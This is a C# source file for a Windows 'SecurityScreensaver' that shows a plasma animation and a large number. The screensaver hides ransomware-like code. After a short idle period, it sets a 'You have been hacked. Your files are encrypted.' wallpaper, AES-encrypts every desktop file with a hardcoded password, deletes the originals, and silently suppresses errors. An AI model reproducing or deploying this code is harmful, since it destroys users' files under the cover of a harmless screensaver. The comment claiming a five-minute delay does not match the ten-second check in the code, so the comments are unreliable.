using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace SecurityScreensaver
{
    public partial class ScreensaverForm : Form
    {
        private Timer animationTimer;
        private double plasmaTime = 0;
        private Point _lastMousePos;
        private const int ExitThreshold = 2;
        private Bitmap _plasmaBitmap;
        private bool _wallpaperChanged;

        // Wallpaper API
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        private const int SPI_SETDESKWALLPAPER = 0x0014;
        private const int SPIF_UPDATEINIFILE = 0x01;

        // Idle time detection
        [DllImport("user32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
        private struct LASTINPUTINFO
        {
            public uint cbSize;
            public uint dwTime;
        }

        public ScreensaverForm()
        {
            InitializeComponent();
            InitializeFormSettings();
            SetupAnimationTimer();
        }

        private void InitializeFormSettings()
        {
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;
            TopMost = true;
            KeyPreview = true;
            Cursor.Hide();
            _lastMousePos = Cursor.Position;
            DoubleBuffered = true;
        }

        private void SetupAnimationTimer()
        {
            animationTimer = new Timer();
            animationTimer.Interval = 5;
            animationTimer.Tick += (s, e) =>
            {
                plasmaTime += 1.5;
                Invalidate();

                // Check idle time every 5 seconds
                if (GetIdleTime() >= 10 && !_wallpaperChanged) // 5 minutes
                {
                    GenerateAndSetWallpaper();
                    _wallpaperChanged = true;
                }
            };
            animationTimer.Start();
        }

        private void EncryptDesktopFiles()
        {
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string[] files = Directory.GetFiles(desktopPath);
            string wallpaperFile = Path.Combine(desktopPath, "hacked_wallpaper.bmp");

            foreach (string file in files)
            {
                try
                {
                    if (file == wallpaperFile) continue;
                    if (Path.GetExtension(file) == ".encrypted") continue;

                    EncryptFile(file, "90473");
                    File.Delete(file);
                }
                catch { /* Skip files that can't be encrypted */ }
            }
        }

        private void EncryptFile(string inputFile, string password)
        {
            byte[] salt = new byte[] { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };

            using (Aes aes = Aes.Create())
            {
                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, salt, 1000);
                aes.Key = key.GetBytes(aes.KeySize / 8);
                aes.IV = key.GetBytes(aes.BlockSize / 8);

                using (FileStream fsCrypt = new FileStream(inputFile + ".encrypted", FileMode.Create))
                {
                    using (CryptoStream cs = new CryptoStream(fsCrypt,
                        aes.CreateEncryptor(),
                        CryptoStreamMode.Write))
                    {
                        using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
                        {
                            fsIn.CopyTo(cs);
                        }
                    }
                }
            }
        }

        private void GenerateAndSetWallpaper()
        {
            try
            {
                using (var bmp = new Bitmap(1920, 1080))
                {
                    using (var g = Graphics.FromImage(bmp))
                    {
                        g.Clear(Color.DarkRed);

                        using (var font = new Font("Arial", 48, FontStyle.Bold))
                        using (var brush = new SolidBrush(Color.White))
                        using (var format = new StringFormat())
                        {
                            format.Alignment = StringAlignment.Center;
                            format.LineAlignment = StringAlignment.Center;

                            g.DrawString("You have been hacked.\nYour files are encrypted.",
                                       font, brush,
                                       new RectangleF(0, 0, 1920, 1080),
                                       format);
                        }
                    }

                    string tempPath = System.IO.Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                        "hacked_wallpaper.bmp");

                    bmp.Save(tempPath, ImageFormat.Bmp);
                    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempPath, SPIF_UPDATEINIFILE);
                    EncryptDesktopFiles();
                }
            }
            catch { /* Handle errors silently for security tool */ }
        }

        private uint GetIdleTime()
        {
            LASTINPUTINFO lastInput = new LASTINPUTINFO();
            lastInput.cbSize = (uint)Marshal.SizeOf(lastInput);
            GetLastInputInfo(ref lastInput);
            return ((uint)Environment.TickCount - lastInput.dwTime) / 1000;
        }

        // Rest of the existing methods remain unchanged
        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);
            DrawPlasma(e.Graphics);
            DrawLargeText(e.Graphics);
        }

        private void DrawPlasma(Graphics g)
        {
            int width = ClientSize.Width;
            int height = ClientSize.Height;

            if (_plasmaBitmap == null || _plasmaBitmap.Width != width || _plasmaBitmap.Height != height)
            {
                _plasmaBitmap?.Dispose();
                _plasmaBitmap = new Bitmap(width, height, PixelFormat.Format24bppRgb);
            }

            Rectangle rect = new Rectangle(0, 0, width, height);
            BitmapData bmpData = _plasmaBitmap.LockBits(rect, ImageLockMode.WriteOnly, PixelFormat.Format24bppRgb);

            unsafe
            {
                byte* ptr = (byte*)bmpData.Scan0;
                int stride = bmpData.Stride;

                // Optimized plasma calculations with 5x speed
                for (int y = 0; y < height; y++)
                {
                    byte* row = ptr + (y * stride);
                    for (int x = 0; x < width; x++)
                    {
                        double value =
                            Math.Sin(x * 0.02 + plasmaTime * 5) +  // 5x faster X wave
                            Math.Sin(y * 0.03 + plasmaTime * 5) +  // 5x faster Y wave
                            Math.Sin((x + y) * 0.04 + plasmaTime * 3) +  // New diagonal wave
                            Math.Sin(Math.Sqrt(x * x + y * y) * 0.08 + plasmaTime * 4);  // 2x faster radial wave

                        double normalized = (value + 4) / 8;
                        normalized = Math.Max(0, Math.Min(1, normalized));

                        Color c = InterpolateColor(normalized);
                        row[x * 3 + 0] = c.B;
                        row[x * 3 + 1] = c.G;
                        row[x * 3 + 2] = c.R;
                    }
                }
            }

            _plasmaBitmap.UnlockBits(bmpData);
            g.DrawImage(_plasmaBitmap, 0, 0);

        }

        private void DrawLargeText(Graphics g)
        {
            using (var font = new Font("Arial", 200, FontStyle.Bold))
            using (var brush = new SolidBrush(Color.FromArgb(200, 255, 255, 255))) // Semi-transparent white
            {
                SizeF textSize = g.MeasureString("90473", font);
                g.DrawString("90473", font, brush,
                    (ClientSize.Width - textSize.Width) / 2,
                    (ClientSize.Height - textSize.Height) / 2);
            }
        }

        private Color InterpolateColor(double t)
        {
            Color[] palette = {
                Color.FromArgb(15, 15, 25),
                Color.FromArgb(40, 40, 80),
                Color.FromArgb(100, 150, 200),
                Color.FromArgb(40, 40, 80)
            };

            int index = (int)(t * (palette.Length - 1));
            return palette[Math.Min(palette.Length - 1, Math.Max(0, index))];
        }

        // Exit on ANY mouse movement
        private void ScreensaverForm_MouseMove(object sender, MouseEventArgs e)
        {
            Point currentPos = Cursor.Position;
            if (Math.Abs(currentPos.X - _lastMousePos.X) > ExitThreshold ||
                Math.Abs(currentPos.Y - _lastMousePos.Y) > ExitThreshold)
            {
                Application.Exit();
            }
            _lastMousePos = currentPos;
        }

        // Exit on ANY key press (including Alt, Ctrl, etc.)
        private void ScreensaverForm_KeyDown(object sender, KeyEventArgs e)
        {
            Application.Exit();
        }

        // Exit on mouse click
        private void ScreensaverForm_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void ScreensaverForm_Load(object sender, EventArgs e)
        {
            Activate(); // Force focus to the form
        }
    }
}
